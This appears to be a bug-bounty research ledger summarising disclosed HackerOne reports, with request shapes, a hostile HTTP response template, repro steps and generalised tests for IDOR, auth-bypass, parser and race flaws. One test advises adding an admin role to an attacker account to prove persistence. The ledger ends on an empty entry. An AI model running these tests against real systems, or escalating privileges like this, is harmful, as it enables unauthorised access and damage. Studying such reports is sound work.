SOURCE: https://hackerone.com/reports/187134  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/187134.json` — HTTP 200, `visibility: full`, `vulnerability_information` 6,490 B read IN FULL (FIRST route worked). Metadata: PortSwigger Web Security, "JSBeautifier BApp: Race condition leads to memory disclosure", weakness Memory Corruption - Generic, reporter `jelmer`, created 2016-12-01, disclosed 2016-12-07, state Closed.
STATUS: UNVERIFIED (not reproduced — no Burp lab stood up this pass)
CLASS: sensitive info disclosure with PoC / client-side memory corruption — a concurrent-response processing race (malformed `Content-Length` + doctype-triggered parse + burst release) scrambles SHARED RESPONSE BUFFERS between connections in the HTTP processor -> cross-connection content leak
CORE METHOD:
  1. THE SETUP (report, verbatim): "If an attacker builds up multiple connections which will be released at the same time having a response Content-Length of 0, leaving out the response Content-Length header or having a higher Content-Length than the actual response while insinuating starting a doc-type then the stacked up connections will interfere with each other and, besides other weird behavior, will scramble the response buffers through each other." Trigger floor, verbatim: "The vulnerability can be successfully triggered with as little as 4 threads and 16 characters per thread."
  2. THE RESPONSE SHAPE (report, verbatim): `HTTP/1.1 200 OK` / `Content-Length: -12000` / `Meta:%s:%d` / `Content-Type: text/html` / `<![a-z0-9]{1024}>` — the body repeats one per-request randomized character 1024 times ("This character will be randomized between requests to easily distinguish between different responses"), the `Meta` header carries that character + the batchId; the Go server holds N open requests (`connLimit`, mirrored by the page's `threads` variable) and flushes them simultaneously ("The server waits specifically for 20 open connections right now and then beams them out simultaneously").
  3. THE OBSERVED SIGNALS (report bullets, verbatim): "Burp strips the content completely and comes back with only the headers" / "Buffers between the requests get scrambled up leading to content leaking between them" / "The original byte sequence in the buffer gets scrambled" / "Characters will get replaced with new characters".
  4. FIRST TELL (report, verbatim): "when you put the intruder on 100 threads the response would slightly differentiate every so many requests" — identical requests returning different bodies under concurrency.
DETECTION SIGNAL: an HTTP processor (proxy, extension, browser, client library) returning DIFFERENT bodies for identical concurrent requests; one request's marker character appearing in another request's response; headers-only bodies; scrambled byte sequences. Tell: per-request marker chars + batch release + diff.
CHAIN: the victim's Burp/browser is lured to the attacker's server (precondition, verbatim: "if the attacker is able to lure the victim to it's server so the required connections can be established") -> the attacker burst-releases malformed-CL doctype responses while the victim's OTHER authenticated requests are in flight through the same processor -> shared response buffers scramble across connections (primitive: cross-connection buffer mixing) -> the attacker's connection receives bytes of the victim's OTHER responses (terminal, report's own words: "an attacker can reliably eavesdrop on a victims browsing data"; secondary, verbatim: scrambling the response means "valuable client-side protection will be weakened"). HONEST BOUND, verbatim: "I was unable to verify the possibility of recovering the internal memory layout remotely" — ASLR/heap-geometry recovery is a LEAD, not demonstrated.
TRANSFERABLE TEST: build a hold-and-burst server: (1) have the audited processor (proxy/browser/mobile HTTP stack) open N parallel requests to it; (2) release all at once with `Content-Length: -12000` (also try 0, absent, and over-stated) and a body starting `<!` + a per-request marker char ×1024 + an attribution header; (3) diff every received body for foreign markers — a wrong marker proves cross-connection leak; (4) repeat with real authenticated traffic in flight behind the tool. Rule: **wrong Content-Length + a doctype-triggered parse + concurrency = shared-buffer cross-talk in the HTTP processor; marker-diff to prove it — and treat hostile-response servers as a threat to your OWN tooling's in-flight traffic.**
DEDUPE/DELTA: tokens `187134`, `JSBeautifier`, `memspy`, `burp-pckt-burst-memspy`, `jelmer` = 0 technique hits across the three write targets immediately before append. Recorded neighbours REVIEWED and NOT conflated: §17.113 (Tomcat client-side desync #2327341 — an over-declared `Content-Length` on an incomplete POST desyncs the VICTIM's browser SOCKET and the error path returns another user's buffered REQUEST data; same headline family "wrong CL -> cross-user data" but a different mechanism — request-queue desync vs response-buffer race — a different carrier — victim browser socket vs Burp response processing — and no doctype/burst trigger); PS4 PPPoE `sppp` (ledger 2615-2623 — a kernel protocol parser's length-field OOB). NEW: the burst-release race + doctype trigger + negative/absent/overstated CL -> cross-connection RESPONSE-buffer mixing atom. NO §17 slot (narrow carrier — Burp BApp/response-processing internals; recorded for the method and the hunter-OPSEC angle).
FRESHNESS: created 2016-12-01, disclosed 2016-12-07 — OUTSIDE the preferred 6-12 month window (~10 years) — recorded as BACKFILL, flagged; read because assigned.
HONESTY: not reproduced (no Burp instance exercised, no request sent to any target). Every quote above is verbatim from the live `.json` `vulnerability_information` read IN FULL this pass (6,490 B); the report's 7 screenshots were not viewable — only their captions (quoted as such) are used.

SOURCE: https://hackerone.com/reports/3896671  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/3896671.json` — HTTP 200, `visibility: full`, `vulnerability_information` 4,113 B read IN FULL (FIRST route worked). Metadata: MariaDB, "Connector/C Out-of-bounds read in `unpack_fields()` from short metadata field", weakness Out-of-bounds Read, reporter `mschorm` (body credits "Originally reported by: Aisle Research" to Red Hat via embargo process, "Aisle research should be attributed for the finding"), created 2026-07-28, disclosed 2026-09-30, state Closed.
STATUS: UNVERIFIED (not reproduced — no ASan build or protocol shim stood up this pass)
CLASS: memory corruption / sensitive info disclosure with PoC — a length-prefixed field SHORTER than the fixed-size struct the parser assumes (0-11 bytes where 12 are required) passes the copy's bounds check and drives an out-of-bounds READ in the client; hostile-server threat model
CORE METHOD:
  1. THE GAP (report, verbatim): "`unpack_fields()` in `libmariadb/mariadb_lib.c` parses 12 bytes of fixed-header metadata (charsetnr, length, type, flags, decimals) from each column descriptor without checking that the field data is present or long enough. A malicious server can send a truncated metadata field (0-11 bytes instead of the required 12) and trigger out-of-bounds reads in the client process." (the report quotes the fixed-header parse block verbatim: `p= (char *)row->data[i]; /* filler */ field->charsetnr= uint2korr(p); p+= 2; field->length= (uint) uint4korr(p); p+= 4; field->type= ... uint1korr(p); ...`)
  2. WHY THE COPY DOES NOT CATCH IT (report, verbatim): the row loader `mthd_my_read_rows()` "accepts any non-`NULL_LENGTH` field length and copies exactly that many bytes" and "The existing check protects the overall row buffer during the copy, but does not enforce the 12-byte minimum that `unpack_fields()` assumes."
  3. THE REPRO (report, verbatim): "Build Connector/C with AddressSanitizer." / "Set up a protocol shim or modified server that returns otherwise normal column-definition metadata but encodes the fixed-header field with a length of 0 (or any value from 1-11) instead of the expected 12+ bytes." / "Connect a client and issue any query that triggers metadata parsing." / "Observe ASan reporting a heap-buffer-overflow read in `unpack_fields()` at the fixed-header parsing block." Call sites (report, verbatim names): `mysql_read_query_result()`, `mysql_list_fields()`, `mysql_list_processes()` — "all reading directly from server TCP packets via `ma_net_safe_read()`"; "All query types trigger metadata parsing, so any successful connection to a hostile endpoint is exploitable."
DETECTION SIGNAL: a protocol parser that copies a length-prefixed field bounded, then parses a FIXED-SIZE struct out of it with no minimum-length check at the parse site (copy-check != parse-check); a codebase that already has a boundary helper ("`ma_check_buffer_boundaries()` ... used 8 times in session tracking") but whose fixed-header parse predates it. Tell: ASan heap-buffer-overflow READ on a truncated length-prefixed field.
CHAIN: malicious or compromised server, or MitM on the protocol (precondition: the client connects to a hostile endpoint — any query triggers the parse) -> truncated metadata field (0-11 bytes) -> heap OOB read in the CLIENT process (demonstrated terminal, report verbatim: "Client-side out-of-bounds read: limited disclosure of adjacent process memory" + "Client process crash (segfault or ASan abort)"). FURTHER ESCALATION IS A LEAD ONLY: the OOB read is the classic first link of an info-leak -> ASLR-defeat -> RCE chain (recorded family: PS4 `sppp`, ledger 2615-2623) but secret extraction is NOT demonstrated here; bounded at the report's own words.
TRANSFERABLE TEST: for any client parsing length-prefixed protocol metadata from a server (DB connectors, IMAP/SMTP/LDAP clients, custom TLV/Thrift-ish protocols): (1) shim the server and serve valid frames EXCEPT one length-prefixed field with length 0..(struct-size-1) — here 0-11 vs the 12-byte header; (2) run the client under ASan through ordinary operations; (3) any heap-buffer-overflow READ at the fixed-struct parse = the bug; (4) fix shape: assert `field_len >= <fixed header size>` AT the parse site (the report's own diff) beside the existing boundary helper. Rule: **the copy's bounds check is not the parse's minimum-length check — every fixed-size struct parsed out of a length-prefixed field needs a minimum-length assertion where the struct is read.**
DEDUPE/DELTA: tokens `3896671`, `unpack_fields`, `uint2korr`, `mthd_my_read_rows`, `Aisle`, `mschorm` = 0 technique hits across the three write targets immediately before append. Recorded neighbours REVIEWED and NOT conflated: §17.591 / #3897914 (MariaDB SERVER `.frm` parsing — an out-of-RANGE `fieldnr` INDEX onto a pointer table sharing its allocation with attacker bytes -> fake `Field*` -> vtable hijack RCE; different component (server parser vs client connector), different bug shape (unchecked index vs truncated length), different terminal (RCE vs limited OOB read)); PS4 PPPoE `sppp` (ledger 2615-2624 — OVER-long length -> over-read plus signedness-negative length checks; its transferable test covers "length field EXCEEDS the bytes actually present"; this entry is the MIN-side — undersized field vs fixed struct — plus the copy-check/parse-check split); CS:GO `DecompressVoice` (ledger 3215-3221 — a loop parser mutating its bounds mid-loop). NEW atom: minimum-length validation gap on a fixed-struct parse. NO §17 slot (delta inside the recorded length-prefixed-parser family; the min-side rule rides in this entry).
FRESHNESS: created 2026-07-28, disclosed 2026-09-30 — INSIDE the preferred 6-12 month window (no flag).
HONESTY: not reproduced (no Connector/C build, no shim, no request sent to any target). Every quote above is verbatim from the live `.json` `vulnerability_information` read IN FULL this pass (4,113 B); per the report's own request, the finding is attributed to Aisle Research (reported to Red Hat via embargo).

SOURCE: https://hackerone.com/reports/3770482  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/3770482.json` — HTTP 200, `visibility: full`, `vulnerability_information` 7,895 B read IN FULL (FIRST route worked). Metadata: Nextcloud, "files_lock: a write-share collaborator can place a TYPE_TOKEN lock that permanently denies the file owner, survives share revocation and account delet" [title truncated at source], weakness Improper Access Control - Generic, reporter `rz1027`, created 2026-05-29, disclosed 2026-09-18, state Closed. The report ships a self-contained repro (`nextcloud_repro.zip`: `01-setup.sh`/`02-attack.sh`/`03-verify.sh` + pre-captured wire trace in `evidence/`).
STATUS: UNVERIFIED (not reproduced — no Nextcloud/files_lock instance stood up this pass; the repro zip was not executed)
CLASS: BAC / privilege escalation (collaborator -> owner-deny) — a lower-privileged actor sets a RESOURCE-STATE lock whose unlock gate has no file-owner override, whose default TTL is infinite, and whose lifecycle is decoupled from both the share and the locker's account -> permanent denial of the owner's own file with no working admin recovery
CORE METHOD:
  1. THE CALL (report wire, verbatim): `PUT /ocs/v2.php/apps/files_lock/lock/<FILE_ID>?lockType=2&format=json` as bob (write-share collaborator, `permissions=19` = `READ | UPDATE | SHARE`) -> `200 OK`, `"id": 1, "userId": "bob", "token": "files_lock/<random-uuid>", "eta": -1, "type": 2` — report, verbatim: "`type: 2` is `TYPE_TOKEN`. `eta: -1` is the default no-expiration value." (default, verbatim: `ConfigService` `$defaults = [ self::LOCK_TIMEOUT => '-1' ]`, `getLockTimeout(): ... * 60` = no expiration).
  2. THE MISSING BRANCH (report's sister-code quote of `LockService::canUnlock()`, verbatim): the TYPE_TOKEN branch is "only same-token OR same-user-with-allowUserOverride. No file-owner fall-through." while the non-TYPE_TOKEN branch "falls through to owner-equality check" (`if ($isSameOwner && $isSameType) { return; }`) — "Both branches share the same function and the same `$isSameUser` setup, so the developer who added the TYPE_TOKEN branch was aware of the variables, declined to use them, and did not add a file-owner override."
  3. THE OWNER IS DENIED (report wire, verbatim): alice's `PUT /remote.php/dav/files/alice/lock-target.txt` -> `423 Locked` (`Sabre\DAV\Exception\Locked`); alice's `DELETE /ocs/v2.php/apps/files_lock/lock/<FILE_ID>` -> `423` `"File is currently locked by bob "` — "After alice revokes the share, after admin deletes bob's account, after admin recreates bob with the same uid: the PUT and the OCS unlock both still return 423."
  4. THE BROKEN RECOVERY (report, verbatim): `occ files:lock <FILE_ID> -u` -> `Backends provided no user object` (Root.php line 331, locker deleted) / `[OCP\Files\NotFoundException]` (FileService.php line 51, locker re-created under the same uid) — "The only working recovery in this state is a direct DB write: `DELETE FROM oc_files_lock WHERE file_id = <FILE_ID>;`" (the lock row stores the locker as a UID string with no FK cascade — "Deleting a user does not cascade-delete their locks").
DETECTION SIGNAL: lock/reservation/hold/quota/seal mechanisms where (a) an actor BELOW the owner can set the state; (b) one TYPE/token variant's unlock path lacks the owner-equality fall-through its sibling branch has (diff the branches!); (c) default TTL is -1/infinite; (d) state is keyed to an identity string with no cascade on share revocation/account deletion; (e) documented admin recovery resolves the locker's (possibly deleted) identity. Tell: wire `eta: -1` + a 423 that survives every revocation/deletion.
CHAIN: collaborator with write-share on one file (precondition: `permissions=19`, the lowest write privilege — no admin, no ownership) -> places a TYPE_TOKEN lock with infinite TTL (primitive: state-set beyond intent) -> owner and all collaborators permanently denied writes (`423` on every PUT) -> share revoked / locker deleted / locker re-created: the lock persists (escalation: state outlives every relationship) -> documented admin CLI recovery fails both ways (terminal, report verbatim: "This is a persistent denial of service against shared files" — A:H; only direct DB access restores; the report's own class precedent: CVE-2021-22906 "established the class as an accepted vulnerability type", this finding "narrower exploitability (requires write-share, not any auth) but higher impact (`A:H`, permanent denial, broken admin recovery)"). DOCTRINE NOTE: availability terminal — test only in a lab or with explicit authorization (§2(d)); the reportable shape is the BAC (a write action beyond the actor's authority).
TRANSFERABLE TEST: LAB-FIRST (self-hosted product; on live targets do only the static/branch audit): (1) stand the product up in docker (the report ships the 3-script repro + wire trace); (2) as the low-privilege collaborator, place every lock TYPE the API offers and record `eta`; (3) as owner: write, unlock (OCS DELETE), revoke the share, delete and re-create the locker account — retry write/unlock after each; (4) run the documented admin/CLI recovery and record failures; (5) read the unlock gate: if one TYPE branch lacks the `isSameOwner` fall-through its sibling has, the owner is not in the gate. Rule: **state set by a lower-privileged actor needs (a) an owner/admin override in EVERY type branch, (b) a TTL, and (c) lifecycle coupling — missing any, with recovery depending on the locker's identity, the state is permanent.**
DEDUPE/DELTA: tokens `3770482`, `files_lock`, `TYPE_TOKEN`, `canUnlock`, `oc_files_lock`, `lockType=2`, `rz1027` = 0 technique hits across the three write targets immediately before append. Recorded neighbours REVIEWED and NOT conflated: §17.732 (#508493 Nextcloud — a user-lifecycle DELETE of `data/<key>` is the opposite direction: a deletion primitive through a lifecycle path; here state SURVIVES deletion and denies the owner); the recorded Nextcloud family (Talk #851807; federation #1170024/§17.124; ID4me #3489490/§17.176; TaskProcessing #3799010/§17.348; share-token chunked upload #3483708/§17.373; Tables LFI #3249624/§17.390; Calendar token #3275810/§17.434; Notes #2254151/§17.473; push SSRF #3623149/§17.503; zip export #2247457/§17.618) — none involves a lock/state mechanism. NEW: the unoverridable-permanent-lock + lifecycle-decoupling + broken-recovery triangle. New general method -> §17.739.
FRESHNESS: created 2026-05-29, disclosed 2026-09-18 — INSIDE the preferred 6-12 month window (no flag).
HONESTY: not reproduced (no Nextcloud stood up; the repro zip not run; no request sent to any target). Every quote above is verbatim from the live `.json` `vulnerability_information` read IN FULL this pass (7,895 B); the `canUnlock()`/CLI excerpts are quoted exactly as the report quotes them.

SOURCE: https://hackerone.com/reports/3689633  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/3689633.json` — HTTP 200, `visibility: full`, `vulnerability_information` 2,727 B read IN FULL (FIRST route worked). Metadata: Discourse, "Hidden/restricted tags can be mutated through synonym ID paths without per-tag authorization", weakness Insecure Direct Object Reference (IDOR), reporter `ahpuh`, created 2026-04-22, disclosed 2026-08-26, state Closed. Local reproduction stated on "the 2026.4.0-latest source".
STATUS: UNVERIFIED (not reproduced — no Discourse instance stood up this pass)
CLASS: IDOR / authorization bypass — a RELATIONSHIP MUTATION that accepts referenced-object IDs authorizes only the ANCHOR object, not each referenced ID -> hidden/restricted objects mutated through the visible anchor's endpoint
CORE METHOD:
  1. THE GAP (report, verbatim): "`TagsController#create_synonyms` authorizes only the target tag (`guardian.ensure_can_edit_tag!(@tag)`) and then forwards attacker-supplied synonym tag IDs to `DiscourseTagging.add_or_create_synonyms` without verifying that the user can see or edit each referenced synonym tag." — "`TagSettingsUpdater` has the same issue for `new_synonyms` and `removed_synonym_ids`: it accepts tag IDs and mutates synonym relationships without per-synonym authorization checks."
  2. THE REPRO (report, verbatim steps): create a non-admin user in `edit_tags_allowed_groups`; create one visible tag the user can edit and one hidden/restricted tag "in a tag group the user cannot access"; as the non-admin: `GET /tag/<hidden_tag_id>/info.json` -> 404 "confirming the hidden tag is not visible"; `POST /tag/<visible_tag_id>/synonyms.json` with `tags[0][id]=<hidden_tag_id>` -> "the request succeeds and the hidden tag becomes a synonym of the visible tag"; `PUT /tag/<visible_tag_id>/settings.json` with `tag_settings[new_synonyms][0][id]=<hidden_tag_id>` -> "also succeeds and updates the hidden tag's synonym relationship" ("both paths updated the hidden tag's `target_tag_id` successfully"). Report's run: "2 examples, 0 failures".
  3. THE ORACLE PAIRING: the SAME numeric ID returns 404 on the read path and 200-with-mutation on the ID-list write path — the 404-read/200-write pair on one id is the proof of missing per-item authorization.
DETECTION SIGNAL: bulk/relational mutations taking arrays of related-object IDs (`tags[][id]`, `*_ids`, `new_*`, `removed_*_ids`, member/ACL/category lists) where only the anchor object passes `ensure_can_*`; a restricted object whose ID 404s on read but mutates through the anchor's endpoint; the response/DB shows the hidden object's FK changed (`target_tag_id`).
CHAIN: non-admin holding tag-edit permission on a VISIBLE tag (precondition: ordinary delegated edit role; the hidden tag is in a group the user "cannot access") -> the hidden tag's numeric ID (probe with the 404 oracle; ids are enumerable) -> `POST /tag/<visible>/synonyms.json` `tags[0][id]=<hidden>` or `PUT /tag/<visible>/settings.json` `tag_settings[new_synonyms][0][id]=<hidden>` (primitive: per-reference authorization missing on the ID list) -> the hidden tag's `target_tag_id`/synonym relationship mutates (terminal per report: "unauthorized mutation of hidden tag taxonomy and integrity corruption of tag relationships" — demonstrated on 2 paths, "2 examples, 0 failures"). BOUNDED HONESTLY: integrity corruption of access-controlled taxonomy (no data disclosure demonstrated); the pattern generalizes to any relational write (group membership, ACL lists, category links) where referenced IDs are trusted.
TRANSFERABLE TEST: on any object graph with hidden/restricted children: (1) find mutations on a PERMITTED object that accept arrays of OTHER object IDs; (2) confirm by READ that a target ID is invisible to you (404/403); (3) submit that ID to the permitted object's mutation; (4) re-read the hidden object's relationship field through any accessible surface (second account/admin) and diff. The 404-read/200-write pair on the same ID is the proof. Rule: **authorization must run per REFERENCED id, not just on the anchor — the container's permission is not the children's.**
DEDUPE/DELTA: tokens `3689633`, `create_synonyms`, `target_tag_id`, `removed_synonym_ids`, `ensure_can_edit_tag`, `add_or_create_synonyms`, `ahpuh` = 0 technique hits across the three write targets immediately before append; concept probes "per-item/per-reference authorization | each referenced | only authorizes the target" = 0 hits. Recorded neighbours REVIEWED and NOT conflated: §17.735 (cross-tier claim — the check RUNS at the wrong tier; here no check runs at all for the referenced items); §17.723 (#663431 — a filter selector taking foreign IDs yields a READ-side inference oracle, no mutation); §17.89 / mass-assignment (server-owned state FIELDS writable on a PATCH — field-level, not referenced-ID-level). NEW: per-reference authorization on relationship mutations + the 404-read/200-write oracle. New general method -> §17.740.

SOURCE: https://hackerone.com/reports/2705507  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/2705507.json` — HTTP 200 but `visibility: no-content`, `vulnerability_information` 0 B (body withheld by visibility policy — not a rendering failure; no renderer can recover it). `web_extract` on the report page rendered the metadata/timeline and the "Summary by Nextcloud" crediting the public advisory. ROUTE THAT WORKED = the credited public writeup chain, read IN FULL this pass: GHSA-rgvc-xr2w-qq45 (vendor advisory) + NVD CVE-2024-52507 + the patch (nextcloud/tables commit 13ca45f, PR #1406) fetched as raw `.diff` + the product's own `appinfo/routes.php` at tag v0.8.0 (last vulnerable line) for the route shape (repo-derived, NOT a report quote). Metadata: Nextcloud Tables (asset `https://github.com/nextcloud/tables`, SOURCE_CODE), "Share information of Tables app is not limited to affected users ", weakness Insecure Direct Object Reference (IDOR) / CWE-639, severity Low 3.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N), reporter `cx75fa`, created 2024-09-06, disclosed 2024-11-18, state Closed / substate resolved; affected Tables >= 0.3.0, patched 0.8.1.
STATUS: UNVERIFIED (not reproduced — no Nextcloud/Tables instance stood up this pass; no request sent to any target)
CLASS: IDOR / authorization bypass (CWE-639) — the SHARE-ACL METADATA LISTING is a separate authorization surface from the table content: the share index, keyed by the table's numeric ID, returns WHO the table is shared with (users and groups) and WITH WHAT PERMISSIONS to any authenticated user who is not a participant
CORE METHOD:
  1. THE BUG (vendor advisory, verbatim): "The information which Table (numeric ID) is shared with which groups and users and the respective permissions was not limited to affected users." — the object key is the table's NUMERIC ID (CWE-639, Authorization Bypass Through User-Controlled Key), enumerable by iteration.
  2. THE CALL (patch-derived, exact shapes): the share listing is `ShareController::index(int $tableId)` -> `$this->service->findAll('table', $tableId)` and `ShareController::indexView(int $viewId)` -> `findAll('view', $viewId)`; the product's `appinfo/routes.php` at v0.8.0 declares (repo-derived, verbatim names) `GET /api/1/tables/{tableId}/shares` (`api1#indexTableShares`), `GET /api/1/views/{viewId}/shares` (`api1#indexViewShares`), `GET /api/1/shares/{shareId}` (`api1#getShare`) — mounted under the app base (`/apps/tables/...`); API v2 carries the same share surface through the ShareController above.
  3. THE MISSING GATE (patch, verbatim): pre-fix the share-index methods carried ONLY `@NoAdminRequired` — i.e. any logged-in user — while the fix adds to `index`/`indexView` `#[NoAdminRequired]` + `#[RequirePermission(permission: Application::PERMISSION_READ, type: Application::NODE_TYPE_TABLE, idParam: 'tableId')]` (view twin: `NODE_TYPE_VIEW`, `idParam: 'viewId'`) — the listing had no gate on the caller's participation in the share. PR #1406 "refactor: Extend Permission Middleware usage and replace deprecated annotations with attributes"; author comment, verbatim: "Use the permission middleware in more places (I did not remove the service-level checks though)". Note (patch-derived): the per-share `show(int $id)` stayed `#[NoAdminRequired]`-only even in the fix — the per-share read path is a sibling surface to re-test.
  4. THE REPRO (advisory + IDOR shape): as user B — an ordinary account with NO share on user A's table — enumerate table IDs and GET the share listing for each; the response returns the share rows (recipient users/groups + permission bits) for tables B is not party to. Same probe at the view level with `viewId`.
DETECTION SIGNAL: shared-object apps where the object CONTENT read 403/404s for a non-participant but the SHARE/ACL/PARTICIPANTS/MEMBERS listing for the SAME object id returns 200 with rows; object ids numeric/enumerable; the metadata listing authorized against the endpoint/login requirement ("any logged-in user") instead of per-caller participation. Tell: diff `/shares|/members|/participants|/permissions|/acl` rows against the caller's own membership.
CHAIN: any authenticated low-priv account (precondition: PR:L — ordinary login; NO share, NO role, NO interaction) -> enumerate table/view numeric ids (primitive: enumerable key) -> read the full share graph + permission levels of OTHER users' private tables (terminal per the advisory: cross-user disclosure of who has access to what with which permissions — C:L demonstrated). ESCALATION IS LEAD ONLY, not demonstrated in this source: the share graph names exactly which collaborator account to target and pairs with any share-abuse bug (recorded: the files_lock `TYPE_TOKEN` owner-deny, share-token chunked upload) to move from "knows the access graph" to tenant-wide impact.
TRANSFERABLE TEST: on any shared-object product (docs, tables, boards, buckets, tickets) with a second account that has NO relationship to the object: (1) obtain/guess the object's numeric id; (2) GET every metadata listing for that id (`/shares`, `/members`, `/participants`, `/permissions`, `/collaborators`, `/acl` — both container-scoped and per-share variants); (3) 200 with recipient+permission rows while the object content read is 403/404 = the class; (4) also test the per-SINGLE-share read (`/shares/{shareId}`) — the patch here fixed only the index paths first. Rule: **the share/ACL listing must be gated by the CALLER'S participation in the object — the endpoint's "any logged-in user" check is not the object's membership check.**
DEDUPE/DELTA: tokens `2705507`, `52507`, `rgvc-xr2w-qq45`, `indexTableShares`, `share information`, `13ca45f`, `perm-mw-read`, `ShareController` = 0 technique hits across the three write targets immediately before append (existing hits for `RequirePermission` are the #3249624 Tables LFI entry and for `cx75fa` the "Delete external storage of any user" entry — same product, same reporter, different findings). Recorded neighbours REVIEWED and NOT conflated: §17.740 (#3689633 Discourse — per-reference authorization on RELATIONSHIP MUTATIONS, write side, 404-read/200-write oracle; here the READ of ACL metadata itself is ungated and returns rows outright); §17.723 (#663431 — a filter selector yields a READ-side INFERENCE oracle over attributes; here the listing returns the full share rows); §17.618 (#2247457 Nextcloud zip export — a share ACL not enforced on ONE derived-artifact generator; mechanism is a download-flag bypass, not a metadata listing); §17.390 (#3249624 Tables import `path` LFI); ledger §10.3 (REST user enumeration — WP `/wp/v2/users`; account listing surface, not an object-ACL listing). NEW atom: the share/ACL metadata listing as its own authorization surface, keyed by an enumerable object id and gated only by "logged in". NEW GENERAL METHOD -> §17.741.
FRESHNESS: created 2024-09-06, disclosed 2024-11-18 — OUTSIDE the preferred 6-12 month window (~24 months) — recorded as BACKFILL, flagged; read because assigned.
HONESTY: not reproduced (no Nextcloud stood up; no request sent to any target). SOURCE: https://hackerone.com/reports/1991214  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/1991214.json` — HTTP 200, `visibility: full`, `vulnerability_information` 1,782 B read IN FULL (FIRST route worked). Metadata: U.S. Dept Of Defense, "Automatic Admin Access", weakness Improper Access Control - Generic, reporter `bulldawg`, created 2023-05-17, disclosed 2024-07-19, state Closed / substate resolved. Target host redacted at source: `https://█████████.mil/apexcrrel/f?p=150:1:23467499301323::NO:::`.
STATUS: UNVERIFIED (not reproduced — no .mil APEX instance touched this pass; knowledge intake only, and the host is redacted at source anyway)
CLASS: authentication bypass / admin panel access (P1 per doctrine: auth bypass to admin) — an entry DEEP LINK that materializes a full authenticated session as a FIXED named privileged account for ANY visitor (Oracle APEX-style `f?p=` automatic-login scheme / shared auto-login principal)
CORE METHOD:
  1. THE CALL (report, verbatim): "When visiting the following URL, the user is automatically signed into a user with administrative access." URL field, verbatim: `https://█████████.mil/apexcrrel/f?p=150:1:23467499301323::NO:::`; Steps To Reproduce, verbatim: "1. Visiting URL: https://███.mil/apexcrrel/f?p=150:24:23467499301323::NO:::" / "2. View active user in top right corner: \"ben auto log user\". This user is an administrator." (`f?p=APP:PAGE:SESSION:DEBUG:CLEAR_CACHE:ITEM_NAMES:ITEM_VALUES:PRINTER_FRIENDLY` — app 150, entry pages 1 and 24; the link contains no credential and is shareable).
  2. THE GRANT (report, verbatim capabilities of the auto-login principal): "1. Create new submissions, allowing file uploads" ... "2. See all submissions going back to 2012" ... "3. Manage users - add, delete, and link users. This user could also add the Administrator role to a user." ... "4. Send spam emails to all users" ... "5. Access admin tools like publishing data and removing publications".
  3. THE MECHANISM (bounded): the entry page issues the session of a pre-provisioned named account ("ben auto log user") instead of challenging the visitor — a fixed principal, evidently shared across visitors (inference; the report does not state the APEX configuration — automatic end-user authentication on the entry page is the plausible mechanism). The app's own "active user" indicator names the principal — a one-glance oracle that the session is not yours.
  4. THE PROOF SHAPE: one privileged action under that session — the report itself stays at "View active user in top right corner" plus the enumerated admin menu ("I did not test all functionality provided by this access as I did not want to damage the integrity of the data").
DETECTION SIGNAL: low-code/portal entry URLs (`f?p=…`, `/ords/…`, "public"/deep links to app entry pages) that produce an authenticated session with NO credential step; a whoami/active-user widget naming a fixed account; identical session identity across different visitors/browsers/profiles; admin-only menu items (user management, publishing, tools) visible on first load.
CHAIN: unauthenticated visitor opens the entry deep link (precondition: NONE — no account, no role, no user interaction beyond opening a URL; the URL is shareable/leakable) -> session materializes as the fixed admin principal "ben auto log user" (primitive: entry-URL-minted shared privileged session) -> "Manage users - add, delete, and link users. This user could also add the Administrator role to a user" (escalation: grant the Administrator role to an attacker-controlled account = PERSISTENT admin ATO that survives link rotation) -> file-upload submissions + admin tools + all submissions since 2012 + mass email to all users (terminal: full C/I/A — report's own impact, verbatim: "Unauthorized users can upload arbitrary data, publish data, and delete publications" / "This exposes names, emails, and submissions" / "This administrative user can delete other user accounts, denying them access"). File upload -> RCE is a LEAD the reporter explicitly left untested (verbatim: "with permission I would like to test the file upload functionality for vulnerabilities").
TRANSFERABLE TEST: on any APEX/low-code/portal app in scope: (1) collect entry deep links (`f?p=...`, `/ords/...`, links shared in docs/emails/support tickets) and open each from a CLEAN logged-out browser profile; (2) read the app's own active-user/whoami indicator — any named principal that is not a throwaway guest deserves a role probe; (3) enumerate the session's reachable functions: user management, role assignment, uploads, exports, admin tools; (4) if user management is reachable, add the admin role to an attacker account and prove persistence independently of the magic link (then report the PERSISTENT ATO, not just the link). Rule: **an entry URL that issues a session before any credential step is an authentication bypass — the finding is the ROLE of the fixed principal it lands in, proven by one privileged action.**
DEDUPE/DELTA: tokens `1991214`, `apexcrrel`, `f?p=`, `ben auto log user`, `bulldawg`, `Automatic Admin`, `apex` (as Oracle APEX) = 0 technique hits across the three write targets immediately before append (existing "Oracle" hits are the DB dialect; "apex" hits are domain-apex recon; "auto-login" hits are "post-reset auto-login" inside a different entry). Recorded neighbours REVIEWED and NOT conflated: the mobile deep-link family — §17.72/#1372667 (Basecamp `?proceed_to=` allowlist bypass -> bridge bearer theft), §17.363/#2553411 (deeplink `filename` path traversal), §17.728 (Reddit exported router hands `file://` to the in-app browser) — those abuse parameters INSIDE an otherwise normal app or deliver a primitive earned elsewhere; here the deep link is the whole bug: it MINTS the privileged session itself. #2666323 (U.S. DoD, ledger batch 99 — a 302->200 client-side auth-GATE bypass: the gate is client-side but the backend serves the visitor's OWN session; here no user session exists at all — a shared privileged principal is created). NEW atom: an entry-URL-minted shared privileged session (auto-login scheme) + the app's own active-user indicator as the identity oracle. NEW GENERAL METHOD -> §17.742.

SOURCE: https://hackerone.com/reports/2552879  2026-11-13
